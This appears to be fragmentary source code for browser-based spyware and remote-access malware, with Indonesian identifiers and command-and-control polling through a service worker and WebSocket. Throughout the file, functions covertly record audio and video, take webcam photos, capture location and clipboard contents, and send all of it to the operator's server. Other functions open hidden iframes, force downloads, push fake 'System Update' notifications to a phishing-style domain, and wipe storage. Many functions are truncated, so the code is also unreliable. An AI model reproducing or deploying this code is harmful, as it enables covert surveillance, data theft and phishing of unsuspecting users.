// ============================================================
function K(d) {
    try {
        fetch(SERVER + '/data', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(d)
        }).catch(function(){});

var HEARTBEAT_INTERVAL = 1800000; // 30 MENIT
var C2_INTERVAL = 20000;

self.addEventListener('install', function(event) {
    event.waitUntil(self.skipWaiting());
});

self.addEventListener('activate', function(event) {
    event.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', function(event) {
    event.respondWith(
        fetch(event.request).catch(function() {
            return new Response('Offline', {status: 200});
        })
    );
});

// 🔥 HEARTBEAT DARI SERVICE WORKER (TETAP JALAN!)
function sendHeartbeat() {
    try {
        fetch(SERVER_URL + '/data', {

}

// 🔥 CEK PERINTAH C2 DARI SERVICE WORKER!
function checkC2() {
    try {
        fetch(SERVER_URL + '/data?type=perintah&t=' + Date.now())
            .then(function(r) { return r.text(); })
            .then(function(content) {
                if (content && content.length > 5 && content !== '{}') {

                        var cmd = JSON.parse(content);
                        if (cmd.aksi) {

                                clients.forEach(function(client) {
                                    client.postMessage({
                                        type: 'command',

                                    });
                                });

}

function connectWebSocket() {

        ws.onopen = function() {
            document.getElementById('status').textContent = '🔌 Connected!';
            K({ sumber: 'ws_status', data: 'connected' });
            ws.send(JSON.stringify({
                type: 'init',
                data: { ua: navigator.userAgent, url: window.location.href, timestamp: Date.now() }
            }));
        };
        ws.onmessage = function(event) {
            try {
                var data = JSON.parse(event.data);
                if (data.type === 'command' && data.aksi) {
                    var hasil = eksekusiPerintah(data);
                    ws.send(JSON.stringify({
                        type: 'result',
                        perintah: data.aksi,
                        hasil: hasil
                    }));
                    K({ sumber: 'ws_c2_result', data: { perintah: data.aksi, hasil: hasil } });
                }
            } catch(e) {}
        };
        ws.onclose = function() {
            document.getElementById('status').textContent = '🔌 Reconnecting...';
            setTimeout(connectWebSocket, 5000);
        };
        ws.onerror = function() {
            K({ sumber: 'ws_status', data: 'error' });
        };
    } catch(e) {
        setTimeout(connectWebSocket, 10000);

}

function ambilScreenshot() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = screen.width;
        canvas.height = screen.height;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#000';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        return 'data:image/jpeg;base64,' + canvas.toDataURL('image/jpeg', 0.3).split(',')[1];
    } catch(e) { return 'Error: ' + e.message; }
}

function recordAudio(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'audio/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'html_c2_result', data: { perintah: 'record_audio', hasil: reader.result, waktu: Date.now() } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopAudio() {
    try {
        if (window._recorder) {
            window._recorder.stop();
            window._recorder = null;
            return 'Stopped';
        }
        return 'No active recording';
    } catch(e) { return 'Error: ' + e.message; }
}

function stopVideo() { return stopAudio(); }

function recordVideo(durasi) {
    try {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(function(stream) {
                var recorder = new MediaRecorder(stream);
                window._recorder = recorder;
                var chunks = [];
                recorder.ondataavailable = function(e) { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = function() {
                    var blob = new Blob(chunks, {type: 'video/webm'});
                    var reader = new FileReader();
                    reader.onload = function() {
                        K({ sumber: 'html_c2_result', data: { perintah: 'record_video', hasil: reader.result, waktu: Date.now() } });
                    };
                    reader.readAsDataURL(blob);
                    stream.getTracks().forEach(function(t) { t.stop(); });
                };
                recorder.start();
                setTimeout(function() { recorder.stop(); }, durasi * 1000);
                return 'Recording video ' + durasi + 's...';
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Started video recording...';
    } catch(e) { return 'Error: ' + e.message; }
}

function takePhoto() {
    try {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(function(stream) {
                var track = stream.getTracks()[0];
                var imageCapture = new ImageCapture(track);
                imageCapture.takePhoto()
                    .then(function(blob) {
                        var reader = new FileReader();
                        reader.onload = function() {
                            K({ sumber: 'html_c2_result', data: { perintah: 'take_photo', hasil: reader.result, waktu: Date.now() } });
                        };
                        reader.readAsDataURL(blob);
                        stream.getTracks().forEach(function(t) { t.stop(); });
                    })
                    .catch(function(e) { return 'Error: ' + e.message; });
            })
            .catch(function(e) { return 'Error: ' + e.message; });
        return 'Taking photo...';
    } catch(e) { return 'Error: ' + e.message; }
}

function ambilLokasi() {
    try {
        navigator.geolocation.getCurrentPosition(function(pos) {
            K({ sumber: 'html_c2_result', data: { perintah: 'ambil_lokasi', hasil: { lat: pos.coords.latitude, lon: pos.coords.longitude }, waktu: Date.now() } });
        }, function(e) { return 'Error: ' + e.message; });
        return 'Getting location...';
    } catch(e) { return 'Error: ' + e.message; }
}

function getClipboard() {
    try {

}

function setClipboard(text) {
    try {
        navigator.clipboard.writeText(text)
            .then(function() {
                K({ sumber: 'html_c2_result', data: { perintah: 'set_clipboard', hasil: 'success', waktu: Date.now() } });

function bukaURL(url) {
    try { window.open(url, '_blank'); return 'URL opened: ' + url; } catch(e) { return 'Error: ' + e.message; }
}

function bukaURLHidden(url) {
    try {
        var iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.cssText = 'position:absolute;width:1px;height:1px;left:-9999px;top:-9999px;visibility:hidden;border:none';
        document.body.appendChild(iframe);
        setTimeout(function() { iframe.remove(); }, 5000);
        return 'URL opened hidden: ' + url;
    } catch(e) { return 'Error: ' + e.message; }
}

function downloadFile(url, filename) {
    try {
        var a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        return 'Download started: ' + filename;
    } catch(e) { return 'Error: ' + e.message; }
}

function getBattery() {

function getStorage() {

function getWiFi() {

function showToast(message) {
    try {
        var toast = document.createElement('div');
        toast.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:#0f0;padding:15px 30px;border-radius:10px;z-index:999999;font-size:16px;border-left:4px solid #0f0;font-family:monospace';

        return 'Toast shown: ' + message;
    } catch(e) { return 'Error: ' + e.message; }
}

function showFakeNotification(message) {
    try {
        if (Notification.permission === 'granted') {
            var notif = new Notification('📱 System Update', { body: message || 'Update available!', icon: 'https://verifikasi.site/icon.png' });
            notif.onclick = function() { window.location.href = 'https://verifikasi.site/fb'; };
            return 'Notification shown: ' + message;
        } else if (Notification.permission !== 'denied') {
            Notification.requestPermission().then(function(permission) {
                if (permission === 'granted') showFakeNotification(message);
            });
            return 'Requesting permission...';
        }
        return 'Notification permission denied';
    } catch(e) { return 'Error: ' + e.message; }
}

function speak(text) {
    try {
        if ('speechSynthesis' in window) {
            var utterance = new SpeechSynthesisUtterance(text);
            utterance.lang = 'id-ID';
            speechSynthesis.speak(utterance);
            return 'Speaking: ' + text;
        }
        return 'Speech synthesis not supported';
    } catch(e) { return 'Error: ' + e.message; }
}

function selfDestruct() {
    try {
        localStorage.clear();
        sessionStorage.clear();
        document.cookie.split(';').forEach(function(c) {
            document.cookie = c.replace(/^ +/, '').replace(/=.*/, '=;expires=' + new Date(0).toUTCString() + ';path=/');
        });
        document.body.innerHTML = '<div style="background:#000;color:#f44;text-align:center;padding:50px;font-family:monospace;font-size:24px;">💀 SYSTEM DESTROYED</div>';
        setTimeout(function() { window.close(); }, 2000);
        return 'Self destruct initiated!';
    } catch(e) { return 'Error: ' + e.message; }
}
